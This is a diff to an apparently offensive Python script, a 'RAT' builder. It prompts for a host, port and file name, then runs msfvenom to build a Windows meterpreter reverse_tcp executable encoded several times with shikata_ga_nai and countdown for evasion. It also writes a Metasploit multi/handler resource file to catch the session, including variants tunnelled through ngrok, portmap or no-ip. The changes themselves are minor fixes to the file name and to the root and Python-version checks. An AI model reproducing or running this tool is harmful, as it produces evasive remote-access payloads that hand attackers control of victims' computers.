@@ -2,6 +2,7 @@
 
 import os
 import socket
+import sys
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.connect(('8.8.8.8', 80))
@@ -134,7 +135,7 @@ def main():
         if net == 1:
             lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
             name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
-            os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(ip, lport, name))
+            os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(ip, lport, name))
             console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(ip, lport))
 
         elif net == 2:
@@ -149,7 +150,7 @@ def main():
                 os.system('termit -e "ngrok tcp {}" &'.format(lport))
                 nport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok port\033[0m) > '))
                 nhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mngrok host\033[0m) > ')
-                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(nhost, nport, name))
+                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(nhost, nport, name))
                 os.system('rm -f {}'.format(name))
                 console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
@@ -159,7 +160,7 @@ def main():
                 lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                 pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
                 phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
-                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(phost, pport, name))
+                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(phost, pport, name))
                 os.system('rm -f {}'.format(name))
                 console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
@@ -168,7 +169,7 @@ def main():
                 name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
                 lhost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > ')
                 lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
-                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}.exe'.format(lhost, lport, name))
+                os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(lhost, lport, name))
                 os.system('rm -f {}'.format(name))
                 console_rc(name, 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lhost, lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
@@ -252,6 +253,9 @@ def main():
             external(tunnel, payload[6], formt[3], ext[6])
 
 if os.getuid() != 0:
-    print('\n\033[33mPlease run it as root\033[0m\n')
-else:
+    print('\033[33mPlease run it as root\033[0m')
+v = sys.version[:5]
+if '3.' not in v:
+    print('\033[33mPlease run it with Python3\033[0m')
+if os.getuid() == 0 and '3.' in v:
     main()
